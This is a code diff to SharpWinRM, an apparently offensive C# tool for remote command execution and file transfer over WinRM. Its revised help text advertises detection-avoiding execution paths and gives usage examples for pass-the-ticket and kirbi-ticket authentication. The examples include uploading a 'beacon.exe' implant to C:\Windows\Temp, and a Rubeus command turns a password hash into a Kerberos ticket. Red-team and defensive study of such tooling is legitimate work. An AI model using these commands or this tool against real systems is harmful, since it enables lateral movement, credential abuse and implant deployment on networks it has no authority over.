@@ -25,7 +25,6 @@ namespace SharpWinRM
             switch (args.Command)
             {
                 case "exec":     Exec.Run(args, ctx);     break;
-                case "invoke":   Invoke.Run(args, ctx);   break;
                 case "upload":   Upload.Run(args, ctx);   break;
                 case "download": Download.Run(args, ctx); break;
                 default:
@@ -50,7 +49,6 @@ namespace SharpWinRM
             if (args.Has("ssl"))   { ctx.Ssl = true; if (ctx.Port == 5985) ctx.Port = 5986; }
             if (args.Has("timeout")) ctx.TimeoutMs = int.Parse(args.Get("timeout"));
 
-            // /ptt — use ticket already in current session
             if (args.Has("ptt"))
             {
                 ctx.Auth     = AuthMode.Ptt;
@@ -59,7 +57,6 @@ namespace SharpWinRM
                 return ctx;
             }
 
-            // /ticket: — import kirbi (file or base64) then connect
             if (args.Has("ticket"))
             {
                 ctx.Auth     = AuthMode.Ticket;
@@ -69,7 +66,6 @@ namespace SharpWinRM
                 return ctx;
             }
 
-            // /password: — plaintext credential
             string user = args.Get("user");
             if (string.IsNullOrEmpty(user))
             {
@@ -101,15 +97,14 @@ namespace SharpWinRM
             Console.WriteLine();
             Console.WriteLine("  COMMANDS");
             Console.WriteLine("    scan      Check if WinRM ports 5985/5986 are open (no auth required)");
-            Console.WriteLine("    exec      Execute a command via cmd.exe (command visible in process args)");
-            Console.WriteLine("    invoke    Execute a PowerShell command via stdin (command NOT in process args)");
-            Console.WriteLine("    upload    Upload a local file to the remote host");
-            Console.WriteLine("    download  Download a remote file to local disk");
+            Console.WriteLine("    exec      Execute a PowerShell command via PSRP (wsmprovhost.exe, no child process)");
+            Console.WriteLine("    upload    Upload a file via WMI registry staging (wmiprvse.exe process tree)");
+            Console.WriteLine("    download  Download a file via WMI registry staging (wmiprvse.exe process tree)");
             Console.WriteLine();
             Console.WriteLine("  AUTH (pick one)");
             Console.WriteLine("    /password:PASS     Plaintext password");
-            Console.WriteLine("    /ptt               Use ticket already in session (klist)");
-            Console.WriteLine("    /ticket:VALUE      Import kirbi then connect (file path or base64)");
+            Console.WriteLine("    /ptt               Use Kerberos ticket already in current session");
+            Console.WriteLine("    /ticket:VALUE      Import kirbi file or base64 kirbi string");
             Console.WriteLine();
             Console.WriteLine("  REQUIRED");
             Console.WriteLine("    /target:HOST       Hostname or IP");
@@ -123,17 +118,15 @@ namespace SharpWinRM
             Console.WriteLine("    /nocolors          Disable colored output");
             Console.WriteLine();
             Console.WriteLine("  COMMAND OPTIONS");
-            Console.WriteLine("    exec / invoke:      /command:CMD");
-            Console.WriteLine("    upload / download:  /local:PATH  /remote:PATH");
+            Console.WriteLine("    exec:              /command:CMD");
+            Console.WriteLine("    upload / download: /local:PATH  /remote:PATH");
             Console.WriteLine();
             Console.WriteLine("  EXAMPLES");
             Console.WriteLine("    SharpWinRM.exe exec     /target:srv01 /domain:CORP /user:jdoe /password:Pass1 /command:whoami");
-            Console.WriteLine("    SharpWinRM.exe exec     /target:srv01 /user:CORP\\jdoe /ptt /command:whoami");
-            Console.WriteLine("    SharpWinRM.exe exec     /target:srv01 /user:CORP\\jdoe /ticket:jdoe.kirbi /command:whoami");
-            Console.WriteLine("    SharpWinRM.exe invoke   /target:srv01 /user:CORP\\jdoe /ptt /command:Get-LocalUser");
-            Console.WriteLine("    SharpWinRM.exe invoke   /target:srv01 /user:CORP\\jdoe /ptt /command:Get-Process | Select Name,Id");
-            Console.WriteLine("    SharpWinRM.exe upload   /target:srv01 /user:CORP\\jdoe /ptt /local:beacon.exe /remote:C:\\Windows\\Temp\\b.exe");
-            Console.WriteLine("    SharpWinRM.exe download /target:srv01 /user:CORP\\jdoe /ptt /remote:C:\\Users\\jdoe\\secret.txt /local:secret.txt");
+            Console.WriteLine("    SharpWinRM.exe exec     /target:srv01 /user:CORP\\jdoe /ptt /command:Get-LocalUser");
+            Console.WriteLine("    SharpWinRM.exe exec     /target:srv01 /user:CORP\\jdoe /ticket:jdoe.kirbi /command:Get-Process");
+            Console.WriteLine("    SharpWinRM.exe upload   /target:srv01 /user:CORP\\jdoe /ptt /local:beacon.exe /remote:C:\\Windows\\Temp");
+            Console.WriteLine("    SharpWinRM.exe download /target:srv01 /user:CORP\\jdoe /ptt /remote:C:\\Users\\jdoe\\output.txt /local:output.txt");
             Console.WriteLine();
             Console.WriteLine("  PTH WORKFLOW (Rubeus → TGT → /ticket:)");
             Console.WriteLine("    Rubeus.exe asktgt /user:jdoe /rc4:HASH /domain:CORP /outfile:jdoe.kirbi");
